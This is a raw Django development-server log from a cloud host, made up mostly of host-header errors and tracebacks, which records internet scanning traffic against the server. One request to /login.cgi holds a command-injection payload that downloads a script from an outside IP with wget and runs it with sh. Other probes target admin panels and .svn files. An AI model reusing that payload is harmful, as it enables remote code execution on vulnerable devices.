During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 14:40:45] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 15:41:46] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 15:43:41] "GET / HTTP/1.1" 400 62377
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 15:43:53] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 16:36:04] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 17:29:16] "GET / HTTP/1.1" 400 62409
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 17:31:08] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 18:03:27] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 18:25:55] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 18:48:20] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 20:39:03] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /manager/html
[10/Dec/2018 20:40:59] "GET /manager/html HTTP/1.1" 400 62776
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 21:28:17] "GET / HTTP/1.1" 400 62408
Not Found: /robots.txt
[10/Dec/2018 21:40:50] "GET /robots.txt HTTP/1.1" 404 5961
[10/Dec/2018 21:40:54] "GET / HTTP/1.1" 200 12874
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 21:42:44] "GET / HTTP/1.1" 400 62405
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'xui.ptlogin2.qq.com:443'. You may need to add 'xui.ptlogin2.qq.com' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /http:/18.220.31.143/
Bad Request: /xui.ptlogin2.qq.com:443
[10/Dec/2018 21:59:59] "OPTION / HTTP/1.1" 400 62151
[10/Dec/2018 21:59:59] "CONNECT xui.ptlogin2.qq.com:443 HTTP/1.1" 400 62536
[10/Dec/2018 21:59:59] "GET http://18.220.31.143/ HTTP/1.1" 400 62350
Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
Bad Request: /http:/api.ipify.org/
[10/Dec/2018 22:00:01] code 400, message Bad request version ('\x03\x00(\x00\x04ÿU\x01\x00\x08\x00\x00\x00MSSQLServer\x00d!\x00\x00')
[10/Dec/2018 22:00:01] " 4            ( ÿU    MSSQLServer d!  " 400 -
[10/Dec/2018 22:00:01] code 400, message Bad request syntax ('\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00M\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[10/Dec/2018 22:00:01] "  +<M    M                                                                                                                                           " 400 -
[10/Dec/2018 22:00:01] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
[10/Dec/2018 22:00:01] "  à          " 400 -
[10/Dec/2018 22:00:01] "GET http://api.ipify.org/ HTTP/1.1" 400 63615
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 23:00:42] "GET / HTTP/1.0" 400 62541
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[10/Dec/2018 23:00:42] "GET / HTTP/1.0" 500 59
----------------------------------------
Exception happened during processing of request from ('178.73.215.171', 48822)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 23:13:37] "GET / HTTP/1.1" 400 62632
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[10/Dec/2018 23:54:27] "GET / HTTP/1.1" 400 62409
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /.svn/entries
[11/Dec/2018 00:11:03] "GET /.svn/entries HTTP/1.1" 400 62960
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 00:50:05] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /ccvv
[11/Dec/2018 02:47:55] "GET /ccvv HTTP/1.1" 400 62607
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 02:59:27] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 03:09:08] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 03:09:10] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 03:09:14] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 03:09:23] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 03:09:40] "GET / HTTP/1.0" 400 62414
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 05:16:06] "GET / HTTP/1.1" 400 62412
[11/Dec/2018 08:02:46] "GET / HTTP/1.1" 200 13663
[11/Dec/2018 08:02:47] "GET /media/media/logo.png HTTP/1.1" 200 11255
[11/Dec/2018 08:02:47] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[11/Dec/2018 08:02:48] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[11/Dec/2018 08:03:07] "GET /login/ HTTP/1.1" 302 0
[11/Dec/2018 08:03:07] "GET / HTTP/1.1" 200 13663
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /login.cgi
[11/Dec/2018 09:56:40] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.244.25.150/x%20-O%20-%3E%20/tmp/x;sh%20/tmp/x%27$ HTTP/1.1" 400 64215
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 10:26:37] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 10:57:44] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 11:00:01] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 11:01:26] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 11:10:57] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 11:28:21] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 11:49:36] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 11:49:49] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:13:10] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:17:24] "GET / HTTP/1.1" 400 62677
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:23:08] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:27:10] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:33:45] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:36:32] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:38:16] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:47:21] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 12:52:26] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:04:36] "GET / HTTP/1.0" 400 62418
[11/Dec/2018 13:05:45] "GET / HTTP/1.1" 200 12874
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:06:24] "GET / HTTP/1.1" 400 62409
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:18:54] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:20:09] "GET / HTTP/1.1" 400 62408
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:26:38] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:35:39] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 13:39:20] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 14:18:18] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 14:39:38] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Bad Request: /
[11/Dec/2018 14:54:41] "GET / HTTP/1.1" 400 62408
[11/Dec/2018 14:54:41] "GET / HTTP/1.1" 400 62408
Not Found: /robots.txt
[11/Dec/2018 14:56:36] "GET /robots.txt HTTP/1.1" 404 5961
[11/Dec/2018 14:56:40] "GET /login/ HTTP/1.1" 200 2576
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:01:44] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:07:35] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:10:13] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:28:17] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:41:19] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:41:21] "GET / HTTP/1.1" 400 62405
[11/Dec/2018 15:41:21] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:51:55] "GET / HTTP/1.0" 400 62721
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 15:53:40] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 16:34:42] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 16:59:50] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 17:09:58] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 17:14:42] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 17:22:01] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 17:40:51] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 17:52:39] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 17:56:12] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 18:01:44] "GET / HTTP/1.0" 400 62416
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 18:33:14] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 18:41:31] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 18:53:54] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 19:11:39] "GET / HTTP/1.1" 400 62529
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 19:55:27] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 19:56:04] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:23:59] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:26:04] "GET / HTTP/1.1" 400 62413
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:38:16] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:38:18] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:39:57] "GET / HTTP/1.0" 400 62420
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:41:04] "GET / HTTP/1.1" 400 62414
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:52:44] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 20:58:34] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 21:08:07] "GET / HTTP/1.0" 400 62419
Not Found: /robots.txt
[11/Dec/2018 21:15:50] "GET /robots.txt HTTP/1.1" 404 5961
[11/Dec/2018 21:15:54] "GET /community/4/members_list HTTP/1.1" 200 4880
[11/Dec/2018 21:23:02] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Dec/2018 21:23:40] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: 'xui.ptlogin2.qq.com:443'. You may need to add 'xui.ptlogin2.qq.com' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /xui.ptlogin2.qq.com:443
